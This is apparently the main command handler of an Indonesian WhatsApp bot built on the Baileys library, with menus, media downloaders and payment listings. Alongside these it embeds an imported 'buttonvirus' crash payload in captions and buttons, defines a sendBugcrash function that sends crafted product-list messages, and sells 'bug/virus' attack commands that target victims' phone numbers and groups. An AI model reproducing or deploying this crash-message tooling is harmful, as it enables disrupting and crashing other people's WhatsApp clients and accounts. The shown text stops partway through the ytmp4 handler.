const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { MessageType, Mimetype } = require("@adiwajshing/baileys")
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_menfes_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const setting = setting_JSON
const welcomeJson = welcome_JSON
const { Configuration, OpenAIApi } = require("openai");
let setkey = require("./key.json");
const { buttonvirus } = require('./src/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./src/upload')
const tiktok = require('./src/tiktok')
const { ytMp4, ytMp3, ytPlay } = require('./lib/yotube')
const { Primbon } = require('scrape-primbon')
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat} = require ('@bochilteam/scraper') 
const { RemoveBgResult, RemoveBgError, removeBackgroundFromImageUrl } = require("remove.bg")
const akinator = JSON.parse(fs.readFileSync('./src/akinator.json'))
const brainly = require('brainly-scraper')
const fetch = require('node-fetch')
const primbon = new Primbon()
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString());

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'Kreyuk'//ubah nama lu
global.botName = 'Kreyuk'//ubah nama bot lu
global.author = '© Kreyuk'//ubah keinginan mu
global.packname = 'Kreyuk'//ubah keinginan mau
global.ownerNumber = ["6285704424543@s.whatsapp.net"]//ubah nomer lu
global.prefa = ['','.']
global.yt = 'https://youtube.com/@kkreyuk9084'
global.mess = {
wait: 'PleaseWait.......',
succes: 'SUKSES✓',
admin: 'Fitur ini spesial Untuk Admin Grup',
botAdmin: 'Jadikan Saya Admin Terlebih dahulu',
owner: 'Hanya Bisa Di Gunakan Oleh Owner',
group: 'Fitur Hanya Bisa Di Gunakan Di Grup',
private: 'Fitur Hanya Bisa Di Gunakan Di Chat Pribadi',
bot: 'Fitur Spesial Untuk Pengguna Saya',
error: 'Erorr Mohon Coba Beberapa Saat Lagi',
}

module.exports = kreyuk = async (kreyuk, kr, chatUpdate, store) => {
try {
        const body = (kr.mtype === 'conversation') ? kr.message.conversation : (kr.mtype == 'imageMessage') ? kr.message.imageMessage.caption : (kr.mtype == 'videoMessage') ? kr.message.videoMessage.caption : (kr.mtype == 'extendedTextMessage') ? kr.message.extendedTextMessage.text : (kr.mtype == 'buttonsResponseMessage') ? kr.message.buttonsResponseMessage.selectedButtonId : (kr.mtype == 'listResponseMessage') ? kr.message.listResponseMessage.singleSelectReply.selectedRowId : (kr.mtype == 'templateButtonReplyMessage') ? kr.message.templateButtonReplyMessage.selectedId : (kr.mtype === 'messageContextInfo') ? (kr.message.buttonsResponseMessage?.selectedButtonId || kr.message.listResponseMessage?.singleSelectReply.selectedRowId || kr.text) : ''
        const budy = (typeof kr.text == 'string' ? kr.text : '')
        const prefix = prefa ? /^[,]/gi.test(body) ? body.match(/^[,]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(kr.message)
        const { type, quotedMsg, mentioned, now, fromMe } = kr
        const isCmd = body.startsWith(prefix)
        const from = kr.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = kr.pushName || "No Name"
        const botNumber = await kreyuk.decodeJid(kreyuk.user.id)
        const itsMeap = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(kr.sender)
        const itsMe = kr.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = kr.quoted ? kr.quoted : kr
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = kr.isGroup ? (kr.key.participant ? kr.key.participant : kr.participant) : kr.key.remoteJid
             const isGroup = kr.chat.endsWith('@g.us')
            
        const groupMetadata = kr.isGroup ? await kreyuk.groupMetadata(kr.chat).catch(e => {}) : ''
        const groupName = kr.isGroup ? groupMetadata.subject : ''
        const participants = kr.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = kr.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = kr.isGroup ? groupMetadata.owner : ''
        const groupMembers = kr.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = kr.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = kr.isGroup ? groupAdmins.includes(kr.sender) : false
    	const isAdmins = kr.isGroup ? groupAdmins.includes(kr.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[kr.sender]
if (typeof user !== 'object') global.db.users[kr.sender] = {}
const chats = global.db.chats[kr.chat]
if (typeof chats !== 'object') global.db.chats[kr.chat] = {}
} catch (err) {
console.error(err)
}

if (!kreyuk.public) {
if (!kr.key.fromMe) return
}

if (!kr.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(kr.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (kr.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(kr.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (kr.sender.startsWith('212')) return kreyuk.updateBlockStatus(kr.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
kreyuk.sendPresenceUpdate('composing', from)
kreyuk.readMessages([kr.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return kreyuk.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `ap`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return kreyuk.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'drop':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `Hallo ${pushname} 👋 ${ucapanWaktu}😁

 🕓 : ${wita} WITA
 🗓️ : ${tanggal} 
 ⏱️ : ${runtime(process.uptime())}
 💻 : ${os.platform()}`
kreyuk.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "ℙ𝔼ℝ𝕀ℕ𝕋𝔸ℍ",
rows: [
{title: "Ｓｔｏｒｅ", rowId: prefix+"store", description: "🛒Tᴏᴋᴏ Sᴀʏᴀ"},
{title: "Ｙｏｕｔｕｂｅ", rowId: prefix+"yt", description: "▶️Jᴀɴɢᴀɴ Lᴜᴘᴀ Dɪ Sᴜʙsʀɪʙᴇ Yᴀ Bᴀɴɢ"},
{title: "Ｉｎｓｔａｇｒａｍ", rowId: prefix+"ig", description: "📷Jᴀɴɢᴀɴ Lᴜᴘᴀ Dɪ Fᴏʟʟᴏᴡ ʏᴀ ʙᴀɴɢ"},
{title: "DOWNLOAD VIDEO", rowId: prefix+"dmnu", description: "⬇️Untuk Menampilkan Perintah Untuk mendownload video"},
{title: "𝙎𝙏𝙄𝘾𝙆𝙀𝙍 𝙈𝘼𝙆𝙀𝙍", rowId: prefix+"stickermaker", description: "♦️Pᴇʀɪɴᴛᴀʜ Uɴᴛᴜᴋ Mᴇᴍʙᴜᴀᴛ Sᴛɪᴄᴋᴇʀ"},
{title: "𝙎𝙀𝙈𝙐𝘼 𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃", rowId: prefix+"allmenu", description: "🧩Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Sᴇᴍᴜᴀ Pᴇʀɪɴᴛᴀʜ"},
{title: "𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃 𝙂𝙍𝙐𝙋", rowId: prefix+"groupmenu", description: "📌Hᴀɴʏᴀ Bɪsᴀ Dɪ Gᴜɴᴀᴋᴀɴ Dɪ Dᴀʟᴀᴍ Gʀᴜᴘ"},
{title: "𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃 𝙋𝙀𝙈𝙄𝙇𝙄𝙆", rowId: prefix+"ownmenu", description: "🗳️Pᴇʀɪɴᴛᴀʜ Iɴɪ Hᴀɴʏᴀ Bɪsᴀ Dɪɢᴜɴᴀᴋᴀɴ Oʟᴇʜ Dᴇᴠᴇʟᴏᴠᴇʀ"},
{title: "𝘽𝙐𝙂/𝙑𝙄𝙍𝙐𝙎", rowId: prefix+"bugmenu", description: "💲Pᴇʀɪɴᴛᴀʜ Iɴɪ Hᴀɴʏᴀ Bɪsᴀ Dɪ Gᴜɴᴀᴋᴀɴ Oʟᴇʜ Usᴇʀ Pʀᴇᴍɪᴜᴍ"}]},

],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'store':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `
Hallo ${pushname} 👋 ${ucapanWaktu}😁
Mau Beli Apa Silahkan 
Pilih List di bawah👇`
kreyuk.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "MURID BUG",
rows: [
{title: " AKSES", rowId: prefix+"transfer", description: "1 Minggu,Rp.5.000"},
{title: " AKSES", rowId: prefix+"transfer", description: "1 Bulan,Rp.10.000"},
{title: " AKSES", rowId: prefix+"transfer", description: "Permanent,Rp.30.000"},
{title: " SEWA BOT", rowId: prefix+"transfer", description: "1 Bulan Rp.,10.000"},
{title: " KIRIM BUG", rowId: prefix+"transfer", description: "1 Nomer,Rp.3.000"}]},

{title: "SCRIPT BOT",
rows: [
{title: "SC STORE", rowId: prefix+"transfer", description: "Sc Store Cocok buat jualan Rp.15.000"},
{title: "SC BUG", rowId: prefix+"transfer", description: "Sc Bug No Pasaran Rp.20.000"},
{title: "SC BUG + Store", rowId: prefix+"transfer", description: "Sc Bug No Pasaran Rp.25.000"}]},
{title: "NOKOS",
rows: [
{title: "Nokos Nya", rowId: prefix+"nksn", description: "klik untuk memilih nokos yg tersedia"}]},
],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'nksn':{
let buttonnks = [
  { buttonId: `${prefix} transfer`, buttonText: { displayText: 'BELI🛒' }, type: 2 }
  ]
  await kreyuk.sendButtonText(kr.chat, buttonnks, `SILAHKAN PILIH NOKOS YG MAU DI BELI

INDONESIA
SINGAPORE
USA
MALAYSIA
RUSSIA
DLL

SILAHKAN PILIH ANGKA BERDASARKAN NOKOS YG KALIAN MAU`, `${global.author}`, kr)
  }
  break
case 'home':{
let timestamp = speed()
let latensi = speed() - timestamp
let tekssss = `  INFO 	
➥🚀 : ${latensi.toFixed(4)} _Second_
➥🗳️ : ${os.hostname()}
➥💻 : ${os.platform()}
➥⏱️ : ${runtime(process.uptime())}
═══════❲ WAKTU 
➥🕓 : ${wita} WITA
➥🗓️ : ${tanggal}

*GANTI TITIK (.) DENGAN KOMA (,)

  MENU PEMILIK
 Addakses @
 Delakses @
 listusr
 Hidetag
 Setppbot
 block
 unblock

  MENU GRUP
.grouplink
.setgcpp [image]
.setnama [text]
.setdesc [text]
.resetgrouplink
.kick [reply/tag]
.hidetag [text]
.tagall [text]
.grup (on/off)
.join [link]

  DOWNLOADER
.play [link]
.tiktok [link]
.ytmp3 [link]
.ytmp4 [link]

  STICKER MAKER
.S (balas photo/video)
.wm (balas sticker)
.sgift (balas video)
.take (balas sticker)
.emojimix (emoji1+emoji2)


  SEARCH MENU
.gimage
.pinterest
.yts
.brainly

  OPEN AI
.ai (query)
.img (query)

  CONVERT AUDIO
.bass
.tupai
.robot
.earrape
.deep
.blown
.reverse
.smooth
.slow
.fast
.fat
.nightcore

  TOOLS
.tourl
.bitly
.toaudio
.tomp3
.tovn
.ssweb
.ttsid
.ttsjp
.ttsko
`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/logo.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'pay':{
let tekssss = `
╔═══════✪ 💠 allpay 
╠.  Untuk Allpay Silahkah scan qr di atas
╠.  dan jangan lupa kirim bukti tf dan kirim
╠.  bukti transfer atas nama
╠ ❐ : wa.me/6285704424543
╠.  
╚═════════════✪`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/qris.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'tsel':{
let tekssss = `
╔═══════✪ ❤️ OVO 
╠.  Ini Adalah Nomer Dana Saya
╠ ❐ : 0895321165313
╠.  
╚═════════════✪`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/tsel.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'gopay':{
let tekssss = `
╔═══════✪ ✅ GOPAY 
╠   SILAHKAN SCAN QR DI ATAS ATAU
╠   Ini Nomer Dana Saya
╠ ❐ : 085704424543
╠.  
╚═════════════✪`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/gopay.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'dana':{
let tekssss = `
╔═══════✪ ☑️ DANA 
╠.  SILAHKAN SCAN QR DI ATAS ATAU
╠   Ini Nomer Dana Saya
╠ ❐ : 085704424543
╠.  
╚═════════════✪`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/dana.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'donasi': case 'donate':{
let tekssss = `╔═══════✪ DONASI
╠➥ : SILAHKAN DONASI LEWAT SINI KAK
╠➥ : DANA : 085704424543
╠➥ : GOPAY : 085704424543
╠➥ : ALLPAY : SCAN LEWAT SITU KAK
╚═════════════✪`
kreyuk.sendMessage(from, { image: fs.readFileSync(`./gambar/qris.jpg`),
 caption: tekssss, 
footer: `global.author © 2023`},
{quoted: kr})
}
break
case 'ownmenu':{
return kr.reply(`╔═══════✪ Menu Pemilik 
╠➥ : Addakses @(user)
╠➥ : Delakses @(user)
╠➥ : Setppbot
╠➥ : hidetag (text)
╠➥ : block
╠➥ : unblock
╚═════════════✪`)
}
break
case 'yt':{
return kr.reply(`╔═══════✪ YouTube Pemilik 
╠.  Berikut Adalah Channel Youtube Saya
╠ ❐ : https://youtube.com/@kkreyuk9084
╠.  Jangan Lupa Di Subscribe Ya
╚═════════════✪`)
}
break
case 'ig':{
return kr.reply(`╔═══════✪ Instagram Pemilik 
╠.  Berikut Adalah Akun Instagram Saya
╠ ❐ : https://www.instagram.com/Kreyfun
╠.  Jangan Lupa Di Folow Ya
╚═════════════✪`)
}
break
case 'ownmenu':{
return kr.reply(`╔═══════✪ Menu Pemilik 
╠➥ : Addakses @(user)
╠➥ : Delakses @(user)
╠➥ : Setppbot
╠➥ : hidetag (text)
╠➥ : block
╠➥ : unblock
╚═════════════✪
© Krey-Bot`)
}
break
case 'yt':{
return kr.reply(`╔═══════✪ YouTube Pemilik 
╠.  Berikut Adalah Channel Youtube Saya
╠ ❐ : https://youtube.com/@kkreyuk9084
╠.  Jangan Lupa Di Subscribe Ya
╚═════════════✪
© Kreyuk`)
}
break
case 'ig':{
return kr.reply(`╔═══════✪ Instagram Pemilik 
╠.  Berikut Adalah Akun Instagram Saya
╠ ❐ : https://www.instagram.com/Kreyfun
╠.  Jangan Lupa Di Folow Ya
╚═════════════✪
© Kreyuk`)
}
break
case 'bot':{
return kr.reply(`Kenapa Manggil Saya Bang😑`)
}
break
case 'a':{
return kr.reply(`anjay mabarr`)
}
break
case 'stickermaker':{
return kr.reply(`╔═══════✪ Sticker Maker
╠ S (balas photo/video)
╠ wm (balas sticker)
╠ sgift (balas video)
╠ take (balas sticker)
╠ emojimix (emoji1+emoji2)
╚═════════════✪`)
}
break
case 'transfer':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `
Hallo ${pushname} 👋 ${ucapanWaktu}😁
Mau bayar lewat apa?. 
Silahkan Pilih Pencet Tombol di bawah
`

kreyuk.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "❝ℙ𝔼𝕄𝔹𝔸𝕐𝔸ℝ𝔸ℕ❞",
rows: [
{title: " ☑️ 𝔻𝔸ℕ𝔸", rowId: prefix+"dana", description: " "},
{title: " ✅ 𝔾𝕆ℙ𝔸𝕐", rowId: prefix+"gopay", description: " "},
{title: " ❤️ ℙ𝕌𝕃𝕊𝔸 𝕋𝕊𝔼𝕃", rowId: prefix+"tsel", description: " "},
{title: " 💠 𝔸𝕃𝕃ℙ𝔸𝕐", rowId: prefix+"pay", description: " "}]},
],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'bugmenu':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `ℍ𝕒𝕝𝕠 ${pushname} 👋 ${ucapanWaktu}😁
ℍ𝕒𝕝𝕠 𝔹𝕖𝕣𝕚𝕜𝕦𝕥 𝔸𝕕𝕒𝕝𝕒𝕙 𝔹𝕦𝕘 ℕ𝕪𝕒`
kreyuk.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "❝𝕊𝕀𝕃𝔸ℍ𝕂𝔸ℕ ℙ𝕀𝕃𝕀ℍ 𝔹𝕌𝔾/𝕍𝕀ℝ𝕌𝕊 ℕ𝕐𝔸❞",
rows: [
{title: "𝗘𝗠𝗢𝗝𝗜", rowId: prefix+"bugemoji", description: "🌷Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Vɪʀᴜs/ʙᴜɢ Eᴍᴏᴊɪ"},
{title: "𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜", rowId: prefix+"verify", description: "✉️Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Vɪʀᴜs/ʙᴜɢ Vᴇʀɪғɪᴋᴀsɪ"},
{title: "𝗪𝗔𝗥𝗥", rowId: prefix+"bugattack", description: "⚔️Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Vɪʀᴜs/ʙᴜɢ Cᴏᴄᴏᴋ Uɴᴛᴜᴋ Pᴇʀᴀɴɢ Sᴀᴍᴀ Rɪᴘᴘᴇʀ"},
{title: "𝗕𝗨𝗚 𝗚𝗥𝗨𝗣", rowId: prefix+"bugg", description: "📦Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Vɪʀᴜs/ʙᴜɢ Cᴏᴄᴏᴋ Uɴᴛᴜᴋ Bᴀɴᴛᴀɪ Gʀᴜᴘ Bᴏᴋᴇᴘ/ʟᴀɪɴ ɴʏᴀ"}]},

],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'unblock': {
let users = kr.mentionedJid[0] ? kr.mentionedJid[0] : kr.quoted ? kr.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kreyuk.updateBlockStatus(users, 'unblock').then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
}
break
case 'block': {
let users = kr.mentionedJid[0] ? kr.mentionedJid[0] : kr.quoted ? kr.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kreyuk.updateBlockStatus(users, 'block').then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
}
break
case 'bugemoji':{
return kr.reply(`╔═══════✪ 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄  
╠➥ .🔻 contoh 62xxxxxx
╠➥ .🖕 contoh 62xxxxxx
╠➥ .♦️ contoh 62xxxxxx
╠➥ .🌷 contoh 62xxxxxx
╠➥ .🗿 contoh 62xxxxxx
╠➥ .🥵 contoh 62xxxxxx
╠➥ .🌹 contoh 62xxxxxx
╠➥ .🍀 contoh 62xxxxxx
╠➥ .🔥 contoh 62xxxxxx
╠➥ .🔰 contoh 62xxxxxx
╠➥ .🥀 contoh 62xxxxxx
╠➥ .🌺 contoh 62xxxxxx
╠➥ .🪨 contoh 62xxxxxx
╠➥ .🌀 contoh 62xxxxxx
╠➥ .❄️ contoh 62xxxxxx
╠➥ .🍄 contoh 62xxxxxx
╚═════════════✪
© Kreyuk`)
}
break
case 'verify':{
return kr.reply(`╔═══════✪ 𝘽𝙐𝙂 𝙑𝙀𝙍𝙄𝙁  
╠📌NOTE HANYA PEMILIK YANG BISA
╠➥ .ban contoh 62xxxxxx 
╠➥ .verif contoh 62xxxxxx 
╠➥ .logout  contoh 62xxxxxx 
╠➥ .kenon  contoh 62xxxxxx 
╚═════════════✪
© Kreyuk`)
}
break
case 'bugattack':{
return kr.reply(`╔═══════✪ 𝘽𝙐𝙂 𝘼𝙏𝙏𝘼𝘾𝙆  
╠➥ .attack contoh 62xxxxxx 
╠➥ .buggam 62xxxxxx
╠➥ .rip contoh 62xxxxxx 
╠➥ .bantai contoh 62xxxxxx 
╠➥ .vbug contoh 62xxxxxx 
╠➥ .darkness contoh 62xxxxxx 
╠➥ .virlok contoh 62xxxxxx 
╠➥ .virkon contoh 62xxxxxx 
╠➥ .katalog contoh 62xxxxxx 
╠➥ .ramout contoh 62xxxxxx 
╠➥ .mental contoh 62xxxxxx
╠➥ .korut contoh 62xxxxxx
╠➥ .rbug contoh 62xxxxxx
╚═════════════✪
© Kreyuk`)
}
break
case 'bugg':{
return kr.reply(`╔═══════✪ 𝘽𝙐𝙂 𝙂𝘾  
╠➥ .buggc Link Group.ꫂ 
╠➥ .otwgc Link Group.ꫂ 
╠➥ .wargc Link Group.ꫂ 
╠➥ .santetgc Link Group.ꫂ 
╠➥ .peranggc Link Group.ꫂ 
╚═════════════✪
© Kreyuk`)
}
break
case 'dmnu':{
return kr.reply(`╔═══════✪ DOWNLOADER
╠➥ play [link]
╠➥ tiktok [link]
╠➥ ytmp3 [link]
╠➥ ytmp4 [link]
╚═════════════✪
© Kreyuk`)
}
break
case 'groupmenu':{
return kr.reply(`╔═══════✪ MENU GRUP
╠➥ grouplink/gl
╠➥ setgcpp [image]
╠➥ setnama [text]
╠➥ setdesc [text]
╠➥ resetgrouplink
╠➥ kick/k [reply/tag]
╠➥ hidetag/h [text]
╠➥ tagall [text]
╠➥ join/jn [link]
╚═════════════✪
© Kreyuk`)
}
break
case 'tiktok':
 if(!text) return kr.reply(`Linknya?`)
 anu = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${text}&apikey=YanzBotz`)
 kreyuk.sendMessage(kr.chat, { video: { url: anu.result.video.no_watermark }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: kr })
 break
case'play': case 'ytplay': {
                if (!text) throw `contoh : ${prefix + command} jedag jedug`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttonsZYK = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video'}, type: 1}
                ]
                let buttonMessageZYK = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: `\nRuntime : ${runtime(process.uptime())}\nSILAHKAN PILIH TOMBOL DI BAWAH`,
                    buttons: buttonsZYK,
                    headerType: 1
                }
                kreyuk.sendMessage(kr.chat, buttonMessageZYK, { quoted: kr })
            }
            break




break
case 'ytmp3':
if (!text) throw `contoh : ${prefix + command} Link Nya`
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return kr.reply(`Linknya Jelek`)
kr.reply(mess.wait)
anu = await ytMp3(`${q}`)
titlenyaa = `JUDUL BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
kreyuk.sendMessage(kr.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: kr })
kreyuk.sendMessage(kr.chat, { audio: { url: anu.result }, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3` }, { quoted: kr })
break
case 'ytmp4':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks= args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return kr.reply(`Linknya Jelek`)
kr.reply(mess.wait)
anu = await ytMp4(`${q}`)
titlenyaa = `JUDUL BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
kreyuk.sendMessage(kr.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: kr })
